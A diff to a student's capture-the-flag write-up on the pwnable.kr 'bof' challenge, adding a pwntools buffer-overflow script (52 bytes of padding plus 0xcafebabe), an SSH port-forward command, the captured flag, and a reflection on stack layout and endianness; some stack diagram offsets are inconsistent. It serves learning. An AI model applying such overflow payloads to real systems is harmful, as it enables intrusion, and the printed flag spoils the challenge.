@@ -127,5 +127,129 @@ binary  0b00110100
 base36  0_1g
 ternary 0t1221
 ```
-The distance between the start of key to the start of overflowme is 52 bytes. Since the size of key is 4bytes, I now know that the payload has 52 bytes of padding and another 4 bytes for the 0xcafebabe!
+The distance between the start of key to the start of overflowme is 52 bytes. Since the size of key is 4bytes, I now know that the payload has 52 bytes of padding and another 4 bytes for 0xcafebabe!
+
+I then wrote a short Python script using pwntools to connect to the bof server, generate the payload and send it to the server:
+```
+from pwn import *
+
+p = remote('localhost', 9000)
+payload = b'A' * 52
+payload += p32(0xcafebabe)
+
+p.sendline(payload)
+p.interactive()
+```
+I then reopened the SSH Bof server with this command:
+```
+ssh bof@pwnable.kr -p2222 -L 9000:localhost:9000
+```
+I did this because I faced issues connecting with p = remote('pwnable.kr', 9000). So I used port forwarding.
+
+Afterwards, I entered the shell, typed in "cat flag", and got the flag!
+
+```
+Daddy_I_just_pwned_a_buff3r!
+```
+
+# Reflection
+
+First time using the buffer overflow exploit that I learnt in my lectures from my course SC3010 Computer Security module, I struggled at first as I thought that the stack looks like this (what was taught in my lectures: 
+
+```
+HIGH MEMORY ADDRESS
+    +-------------------------+ <--- ebp + 0xC
+    |                         |
+    |           KEY           |  4bytes
+    |                         |
+    +-------------------------+ <--- ebp + 0x8
+    |                         |
+    |   EIP/ return address   |  8bytes
+    |                         |
+    +-------------------------+ <--- ebp pointer, ebp + 0x0
+    |                         |
+    |     Saved old ebp       |  8bytes  
+    |                         |              
+    +-------------------------+
+    |                         |
+    |      overwriteme        |  8bytes
+    |                         |              
+    +-------------------------+
+    |                         |
+    |      overwriteme        |  8bytes
+    |                         |
+    +-------------------------+
+    |                         |
+    |      overwriteme        |  8bytes
+    |                         |  
+    |                         |
+    +-------------------------+
+    |                         |
+    |      overwriteme        |  8bytes
+    |                         |  
+    |                         |
+    +-------------------------+ <--- Our input starts here 
+    |                         |
+    |   ...                   |
+    +-------------------------+
+LOW MEMORY ADDRESS
+```
+Therefore, I thought I needed 48 bytes of padding and 4 bytes for the key. I was wrong. Therefore I need RaDare2 to disassemble the executable to see what the stack really looks like. 
+```
+HIGH MEMORY ADDRESS
+    +-------------------------+ <--- ebp + 0x8
+    |                         |
+    |           KEY           |  4bytes
+    |                         |
+    +-------------------------+ <--- ebp + 0x4
+    |                         |
+    |   EIP/ return address   |  4bytes
+    |                         |
+    +-------------------------+ <--- ebp pointer, ebp + 0x0
+    |                         |
+    |     Saved old ebp       |  4bytes  
+    |                         |              
+    +-------------------------+ <--- ebp - 0x4
+    |                         |
+    |  Some gap/data, canary? |  8bytes 
+    |                         |              
+    +-------------------------+ <--- ebp - 0xC
+    |                         |
+    |      overwriteme        |  8bytes
+    |                         |
+    +-------------------------+ <--- ebp - 0x14
+    |                         |
+    |      overwriteme        |  8bytes
+    |                         |  
+    |                         |
+    +-------------------------+ <--- ebp - 0x1C
+    |                         |
+    |      overwriteme        |  8bytes
+    |                         |  
+    |                         |
+    +-------------------------+ <--- ebp + 0x24
+    |                         |  8bytes
+    |      overwriteme        |
+    +-------------------------+ <--- ebp + 0x2C, our input starts here
+LOW MEMORY ADDRESS
+```
+I learnt how to use RaDare2 to break down the executable and perform reverse engineering to figure out the exact number of bytes for my payload.
+
+I also learnt that this system uses little endian, so the last 4 bytes of the payload should be \xbe\xba\xfe\xca. Therefore in memory, it looks like this:
+```
+HIGH MEMORY ADDRESS
++--------------------+  ←─ ebp + 0x8
+|      [0xCA]        |  
++--------------------+  ←─ ebp + 0x7
+|      [0xFE]        |  
++--------------------+  ←─ ebp + 0x6
+|      [0xBA]        | 
++--------------------+  ←─ ebp + 0x5
+|      [0xBE]        |  
++--------------------+  ←─ ebp + 0x4
+LOW MEMORY ADDRESS
+```
+CPU will read from lower to higher addresses. So BE will be read first, then BA, FE, CA. In little-endian, data is built from right to left, so we end up with 0xcafebabe! (yay, super confusing ngl)
+
+Pretty challenging CTF for me, spent about 2 days on this, but very rewarding!
 
